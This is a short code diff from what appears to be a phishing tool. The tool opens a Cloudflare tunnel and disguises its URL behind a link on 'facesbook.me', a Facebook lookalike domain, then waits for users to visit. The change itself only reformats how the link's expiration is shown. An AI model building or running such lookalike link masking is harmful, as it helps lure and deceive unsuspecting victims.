@@ -17,7 +17,7 @@ import subprocess
 from pyngrok import ngrok
 from pyfiglet import Figlet
 from termcolor import colored
-from datetime import datetime
+from datetime import datetime, timedelta, timezone
 from tzlocal import get_localzone
 import pytz
 from threading import Thread
@@ -171,11 +171,23 @@ def start_cloudflared(httpd, port):
                 cldflr_url = match.group(0)
                 fb_url, expiration, error = make_fb_link(cldflr_url)
                 if not error:
-                   formatted_expiration = expiration.strftime("%Y-%m-%d %I:%M:%S %p")
-   
+                #    formatted_expiration = expiration.strftime("%Y-%m-%d %I:%M:%S %p")
+                   current_time = datetime.now(timezone.utc)  # Current time with UTC timezone
+
+                   # Calculate the time remaining
+                   time_remaining = expiration - current_time
+                   
+                   # Format the time remaining
+                   days, seconds = divmod(time_remaining.seconds + time_remaining.days * 86400, 86400)
+                   hours, seconds = divmod(seconds, 3600)
+                   minutes, seconds = divmod(seconds, 60)
+                   
+                   formatted_remaining_time = "{:02}d {:02}h {:02}m {:02}s".format(days, hours, minutes, seconds)
                    small_title_fb()
+                   print(f"Formatted Expiration: {expiration.strftime('%Y-%m-%d %I:%M:%S %p %Z')}")
+                   print(f"Time Remaining: {formatted_remaining_time}")
                    print(f"\n\033[32mfacesbook.me Url: \033[0m\033[34m{fb_url}\033[0m")
-                   print(f"\n\033[32mfacesbook.me Expire Time: \033[0m\033[33m{formatted_expiration}\033[0m")
+                #    print(f"\n\033[32mfacesbook.me Expire Time: \033[0m\033[33m{formatted_remaining_time}\033[0m")
                    print(f"\n\033[32mCloudflared Url: \033[0m\033[34m{cldflr_url}\033[0m")
                    print(f"\n\033[32mWaiting For users... \033")
                    link_created = True
